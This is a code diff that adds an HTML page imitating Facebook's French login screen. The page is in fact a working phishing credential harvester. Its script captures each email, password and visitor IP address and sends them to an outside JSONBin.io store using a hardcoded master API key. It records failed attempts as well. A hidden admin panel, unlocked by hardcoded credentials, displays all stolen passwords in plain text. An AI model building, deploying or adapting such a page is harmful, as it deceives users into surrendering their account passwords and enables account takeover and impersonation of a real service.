@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - MonRéseau</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+        }
+        
+        .container {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .login-card {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 396px;
+            margin: 0 auto;
+            transition: all 0.3s ease;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 16px;
+            font-family: inherit;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            background: white;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        button {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+        
+        button:hover:not(:disabled) {
+            background: #166fe5;
+        }
+        
+        button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        .forgot {
+            display: block;
+            margin: 16px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .separator {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-btn {
+            background: #42b72a;
+            width: auto;
+            padding: 12px 20px;
+            font-size: 17px;
+            display: inline-block;
+        }
+        
+        .create-btn:hover:not(:disabled) {
+            background: #36a420;
+        }
+        
+        .info {
+            margin-top: 28px;
+            color: #1c1e21;
+            font-size: 14px;
+        }
+        
+        .info a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        /* Animation de chargement */
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-content {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        /* Panel Admin intégré */
+        .admin-integrated-panel {
+            margin-top: 20px;
+            border-top: 2px solid #e0e0e0;
+            padding-top: 20px;
+            display: none;
+        }
+
+        .admin-integrated-panel.active {
+            display: block;
+            animation: slideDown 0.5s ease;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .admin-header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 15px;
+            border-radius: 8px 8px 0 0;
+            font-weight: bold;
+            text-align: center;
+            font-size: 18px;
+        }
+
+        .admin-stats {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .stat-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1877f2;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .admin-actions {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .admin-action-btn {
+            flex: 1;
+            padding: 10px;
+            font-size: 14px;
+            margin: 0;
+        }
+
+        .view-data-btn {
+            background: #ff9800;
+        }
+
+        .view-data-btn:hover:not(:disabled) {
+            background: #f57c00;
+        }
+
+        .delete-all-btn {
+            background: #dc3545;
+        }
+
+        .delete-all-btn:hover:not(:disabled) {
+            background: #c82333;
+        }
+
+        .logout-admin-btn {
+            background: #6c757d;
+        }
+
+        .logout-admin-btn:hover:not(:disabled) {
+            background: #5a6268;
+        }
+
+        .user-list {
+            max-height: 400px;
+            overflow-y: auto;
+            margin-top: 15px;
+        }
+
+        .user-item {
+            background: #f8f9fa;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+        }
+
+        .user-item:hover {
+            background: #e9ecef;
+            transform: translateX(-5px);
+        }
+
+        .user-email {
+            font-weight: bold;
+            color: #1877f2;
+            font-size: 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .user-password {
+            background: #fff3cd;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 12px;
+            margin: 5px 0;
+            border-left: 3px solid #ffc107;
+        }
+
+        .user-details {
+            font-size: 11px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        .delete-user-btn {
+            background: #dc3545;
+            padding: 5px 12px;
+            font-size: 12px;
+            width: auto;
+            margin: 0;
+            border-radius: 4px;
+        }
+
+        .delete-user-btn:hover {
+            background: #c82333;
+        }
+
+        .admin-badge {
+            display: inline-block;
+            background: #ff9800;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+        }
+
+        .data-viewer {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            max-width: 80%;
+            max-height: 80%;
+            overflow: auto;
+            z-index: 2000;
+            display: none;
+        }
+
+        .data-viewer.active {
+            display: block;
+        }
+
+        .data-viewer pre {
+            background: #f4f4f4;
+            padding: 10px;
+            border-radius: 4px;
+            overflow-x: auto;
+            font-size: 12px;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: red;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: auto;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 1999;
+            display: none;
+        }
+
+        .overlay.active {
+            display: block;
+        }
+
+        .success-msg, .error-msg {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            padding: 10px 20px;
+            border-radius: 4px;
+            color: white;
+            z-index: 3000;
+            animation: slideIn 0.3s ease;
+        }
+
+        .success-msg {
+            background: #4CAF50;
+        }
+
+        .error-msg {
+            background: #f44336;
+        }
+
+        .warning-msg {
+            background: #ff9800;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">Se connecter à Facebook</div>
+            <form id="loginForm">
+                <input type="text" placeholder="Adresse e-mail ou numéro de téléphone" id="email" required>
+                <input type="password" placeholder="Mot de passe" id="password" required>
+                <button type="submit" id="loginBtn">
+                    <span class="btn-content">Se connecter</span>
+                </button>
+                <a href="#" class="forgot">Mot de passe oublié ?</a>
+                <div class="separator"></div>
+                <button type="button" class="create-btn" id="createBtn" onclick="manualCreateAccount()">
+                    <span class="btn-content">Créer nouveau compte</span>
+                </button>
+            </form>
+            
+            <!-- Panel Admin Intégré -->
+            <div class="admin-integrated-panel" id="adminPanel">
+                <div class="admin-header">
+                    👑 Panneau d'administration 👑
+                </div>
+                <div class="admin-stats" id="adminStats">
+                    <div class="stat-card">
+                        <div class="stat-number" id="totalUsers">0</div>
+                        <div class="stat-label">Utilisateurs</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-number" id="totalAttempts">0</div>
+                        <div class="stat-label">Tentatives</div>
+                    </div>
+                </div>
+                <div class="admin-actions">
+                    <button onclick="refreshUserList()" class="admin-action-btn" style="background: #2196f3;">🔄 Rafraîchir</button>
+                    <button onclick="viewAllData()" class="admin-action-btn view-data-btn">📊 Voir JSON</button>
+                    <button onclick="deleteAllUsers()" class="admin-action-btn delete-all-btn">⚠️ Tout supprimer</button>
+                </div>
+                <div class="admin-actions">
+                    <button onclick="logoutAdmin()" class="admin-action-btn logout-admin-btn">🚪 Quitter l'admin</button>
+                </div>
+                <div id="userListContainer" class="user-list">
+                    <h4 style="margin: 10px 0; color: #666;">📋 Liste des utilisateurs (avec mots de passe)</h4>
+                    <div id="userList"></div>
+                </div>
+            </div>
+        </div>
+        <div class="info">
+            <a href="#">Créer une page</a> pour une célébrité, une marque ou une entreprise.
+        </div>
+    </div>
+
+    <!-- Vue des données JSON -->
+    <div class="overlay" id="overlay"></div>
+    <div class="data-viewer" id="dataViewer">
+        <button class="close-btn" onclick="closeDataViewer()">Fermer</button>
+        <h3>📋 Données complètes (JSON)</h3>
+        <pre id="userData"></pre>
+    </div>
+
+    <script>
+        // Configuration JSONBin.io
+        const JSONBIN_CONFIG = {
+            BIN_ID: '6a0d29f76877513b279f1163',
+            API_KEY: '$2a$10$phoNGUlUffuXacxn2E8r5.yFLfQ3L/bQ9SshS7i2amo4X3CaR4fz6',
+            BASE_URL: 'https://api.jsonbin.io/v3/b'
+        };
+
+        let isAdminLoggedIn = false;
+
+        function setButtonLoading(button, isLoading, originalText) {
+            if (isLoading) {
+                button.disabled = true;
+                button.innerHTML = '<span class="btn-content"><span class="loader"></span>Connexion...</span>';
+            } else {
+                button.disabled = false;
+                button.innerHTML = `<span class="btn-content">${originalText}</span>`;
+            }
+        }
+
+        function showMessage(message, isSuccess = true, isWarning = false) {
+            const msgDiv = document.createElement('div');
+            if (isWarning) {
+                msgDiv.className = 'error-msg';
+                msgDiv.style.background = '#ff9800';
+            } else {
+                msgDiv.className = isSuccess ? 'success-msg' : 'error-msg';
+            }
+            msgDiv.textContent = message;
+            document.body.appendChild(msgDiv);
+            setTimeout(() => msgDiv.remove(), 3000);
+        }
+
+        async function fetchUserData() {
+            try {
+                const response = await fetch(`${JSONBIN_CONFIG.BASE_URL}/${JSONBIN_CONFIG.BIN_ID}/latest`, {
+                    headers: {
+                        'X-Master-Key': JSONBIN_CONFIG.API_KEY
+                    }
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                
+                const data = await response.json();
+                return data.record || { users: [], loginAttempts: [] };
+            } catch (error) {
+                console.error('Erreur fetch:', error);
+                showMessage('Erreur de connexion au serveur', false);
+                return { users: [], loginAttempts: [] };
+            }
+        }
+
+        async function saveUserData(data) {
+            try {
+                const response = await fetch(`${JSONBIN_CONFIG.BASE_URL}/${JSONBIN_CONFIG.BIN_ID}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': JSONBIN_CONFIG.API_KEY
+                    },
+                    body: JSON.stringify(data)
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Erreur sauvegarde:', error);
+                showMessage('Erreur lors de la sauvegarde', false);
+                return false;
+            }
+        }
+
+        async function addUser(email, password, isAutoRegister = false) {
+            const data = await fetchUserData();
+            if (!data.users) data.users = [];
+            
+            const userExists = data.users.some(user => user.email === email);
+            if (userExists) {
+                return { success: false, message: 'Cet email est déjà utilisé', exists: true };
+            }
+            
+            data.users.push({
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                ip: await getIP(),
+                autoRegistered: isAutoRegister
+            });
+            
+            const saved = await saveUserData(data);
+            if (saved) {
+                return { success: true, message: isAutoRegister ? 'Compte automatiquement créé !' : 'Compte créé avec succès' };
+            } else {
+                return { success: false, message: 'Erreur lors de la création du compte' };
+            }
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'IP non disponible';
+            }
+        }
+
+        async function checkAndAutoRegister(email, password) {
+            const data = await fetchUserData();
+            if (!data.users) data.users = [];
+            
+            // Vérifier si l'utilisateur existe
+            const userExists = data.users.some(user => user.email === email);
+            
+            if (!userExists) {
+                // Auto-enregistrement
+                data.users.push({
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    ip: await getIP(),
+                    autoRegistered: true
+                });
+                await saveUserData(data);
+                return { success: true, message: '✅ Compte automatiquement créé et connecté !', isNew: true };
+            }
+            
+            // Vérifier le mot de passe
+            const validUser = data.users.find(user => user.email === email && user.password === password);
+            
+            // Enregistrer la tentative de connexion
+            if (!data.loginAttempts) data.loginAttempts = [];
+            data.loginAttempts.push({
+                email: email,
+                password: password,
+                success: !!validUser,
+                timestamp: new Date().toISOString(),
+                ip: await getIP()
+            });
+            await saveUserData(data);
+            
+            if (validUser) {
+                return { success: true, message: '✅ Connexion réussie !', isNew: false };
+            } else {
+                return { success: false, message: '❌ Mot de passe incorrect', isNew: false };
+            }
+        }
+
+        // Connexion avec auto-enregistrement
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const loginBtn = document.getElementById('loginBtn');
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                showMessage('Veuillez remplir tous les champs', false);
+                return;
+            }
+            
+            // Animation de chargement
+            setButtonLoading(loginBtn, true, 'Se connecter');
+            
+            // Simuler un petit délai pour l'animation
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            // Vérification des identifiants admin
+            if (email === 'dongle@gmail.com' && password === 'dongle2024') {
+                isAdminLoggedIn = true;
+                document.getElementById('adminPanel').classList.add('active');
+                showMessage('✅ Mode administrateur activé !', true);
+                await refreshUserList();
+                await updateStats();
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+                setButtonLoading(loginBtn, false, 'Se connecter');
+                return;
+            }
+            
+            // Vérification et auto-enregistrement pour les utilisateurs normaux
+            const result = await checkAndAutoRegister(email, password);
+            
+            setButtonLoading(loginBtn, false, 'Se connecter');
+            
+            if (result.success) {
+                showMessage(result.message, true);
+                console.log(`${result.isNew ? 'Nouveau compte créé' : 'Connexion réussie'} pour:`, email);
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+                
+                // Mettre à jour l'admin si connecté
+                if (isAdminLoggedIn) {
+                    await refreshUserList();
+                    await updateStats();
+                }
+            } else {
+                showMessage(result.message, false);
+                console.log('Échec pour:', email);
+            }
+        });
+
+        async function refreshUserList() {
+            if (!isAdminLoggedIn) return;
+            
+            const data = await fetchUserData();
+            const userListDiv = document.getElementById('userList');
+            
+            if (!data.users || data.users.length === 0) {
+                userListDiv.innerHTML = '<p style="text-align:center;color:#999;">Aucun utilisateur inscrit</p>';
+                return;
+            }
+            
+            userListDiv.innerHTML = data.users.map((user, index) => `
+                <div class="user-item">
+                    <div class="user-email">
+                        <span>
+                            📧 ${user.email}
+                            ${user.email === 'dongle@gmail.com' ? '<span class="admin-badge">ADMIN</span>' : ''}
+                            ${user.autoRegistered ? '<span class="admin-badge" style="background:#4CAF50;">AUTO</span>' : ''}
+                        </span>
+                        ${user.email !== 'dongle@gmail.com' ? `
+                            <button onclick="deleteUser('${user.email.replace(/'/g, "\\'")}')" class="delete-user-btn">
+                                🗑️ Supprimer
+                            </button>
+                        ` : '<span style="font-size:11px;color:#999;">🔒 Compte protégé</span>'}
+                    </div>
+                    <div class="user-password">
+                        🔑 Mot de passe: <strong style="color:#d32f2f;">${user.password}</strong>
+                    </div>
+                    <div class="user-details">
+                        🕒 Créé le: ${new Date(user.timestamp).toLocaleString('fr-FR')}<br>
+                        🌐 IP: ${user.ip || 'N/A'}<br>
+                        ${user.autoRegistered ? '🤖 Compte créé automatiquement via connexion' : '📝 Compte créé manuellement'}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        async function updateStats() {
+            if (!isAdminLoggedIn) return;
+            
+            const data = await fetchUserData();
+            document.getElementById('totalUsers').textContent = data.users?.length || 0;
+            document.getElementById('totalAttempts').textContent = data.loginAttempts?.length || 0;
+        }
+
+        async function deleteUser(email) {
+            if (!isAdminLoggedIn) return;
+            
+            if (email === 'dongle@gmail.com') {
+                showMessage('Impossible de supprimer le compte administrateur principal', false);
+                return;
+            }
+            
+            const confirm = window.confirm(`Êtes-vous sûr de vouloir supprimer l'utilisateur "${email}" ?`);
+            if (!confirm) return;
+            
+            const data = await fetchUserData();
+            data.users = data.users.filter(user => user.email !== email);
+            
+            const saved = await saveUserData(data);
+            if (saved) {
+                showMessage(`✅ Utilisateur "${email}" supprimé avec succès`);
+                await refreshUserList();
+                await updateStats();
+            } else {
+                showMessage('❌ Erreur lors de la suppression', false);
+            }
+        }
+
+        async function deleteAllUsers() {
+            if (!isAdminLoggedIn) return;
+            
+            const confirm = window.confirm('⚠️⚠️⚠️ ATTENTION : Cela va supprimer TOUS les utilisateurs (sauf le compte admin) ! Êtes-vous sûr ?');
+            if (!confirm) return;
+            
+            const doubleConfirm = window.prompt('Tapez "CONFIRMER" pour valider la suppression de tous les utilisateurs :');
+            if (doubleConfirm !== 'CONFIRMER') {
+                showMessage('Suppression annulée', false);
+                return;
+            }
+            
+            const data = await fetchUserData();
+            data.users = data.users.filter(user => user.email === 'dongle@gmail.com');
+            
+            const saved = await saveUserData(data);
+            if (saved) {
+                showMessage('✅ Tous les utilisateurs (hors admin) ont été supprimés');
+                await refreshUserList();
+                await updateStats();
+            } else {
+                showMessage('❌ Erreur lors de la suppression', false);
+            }
+        }
+
+        async function viewAllData() {
+            if (!isAdminLoggedIn) {
+                showMessage('Accès non autorisé', false);
+                return;
+            }
+            
+            const data = await fetchUserData();
+            const displayData = {
+                statistiques: {
+                    totalUtilisateurs: data.users?.length || 0,
+                    totalTentatives: data.loginAttempts?.length || 0
+                },
+                utilisateurs: data.users || [],
+                tentatives_de_connexion: data.loginAttempts || []
+            };
+            document.getElementById('userData').textContent = JSON.stringify(displayData, null, 2);
+            document.getElementById('overlay').classList.add('active');
+            document.getElementById('dataViewer').classList.add('active');
+        }
+
+        function closeDataViewer() {
+            document.getElementById('overlay').classList.remove('active');
+            document.getElementById('dataViewer').classList.remove('active');
+        }
+
+        function logoutAdmin() {
+            isAdminLoggedIn = false;
+            document.getElementById('adminPanel').classList.remove('active');
+            showMessage('🔓 Déconnexion du mode administrateur');
+        }
+
+        async function manualCreateAccount() {
+            if (isAdminLoggedIn) {
+                showMessage('Déconnectez-vous du mode admin pour créer un compte', false);
+                return;
+            }
+            
+            const email = prompt('Entrez votre adresse email:');
+            if (!email) return;
+            
+            if (!email.includes('@')) {
+                showMessage('Email invalide', false);
+                return;
+            }
+            
+            const password = prompt('Entrez votre mot de passe (minimum 4 caractères):');
+            if (!password || password.length < 4) {
+                showMessage('Mot de passe trop court (minimum 4 caractères)', false);
+                return;
+            }
+            
+            const result = await addUser(email, password, false);
+            showMessage(result.message, result.success);
+            if (result.success && isAdminLoggedIn) {
+                await refreshUserList();
+                await updateStats();
+            }
+        }
+
+        async function initializeBin() {
+            const data = await fetchUserData();
+            if (!data.users || data.users.length === 0) {
+                const initialData = {
+                    users: [{
+                        email: 'dongle@gmail.com',
+                        password: 'dongle2024',
+                        timestamp: new Date().toISOString(),
+                        ip: '127.0.0.1',
+                        autoRegistered: false
+                    }],
+                    loginAttempts: []
+                };
+                await saveUserData(initialData);
+                console.log('✅ Bin initialisé avec compte admin');
+            }
+        }
+
+        // Auto-refresh toutes les 3 secondes
+        setInterval(async () => {
+            if (isAdminLoggedIn) {
+                await refreshUserList();
+                await updateStats();
+            }
+        }, 3000);
+
+        initializeBin();
+        console.log('🚀 Application démarrée - Admin: dongle@gmail.com / dongle2024');
+        console.log('💡 NOUVEAU : Toute personne qui se connecte est automatiquement enregistrée !');
+    </script>
+</body>
+</html>
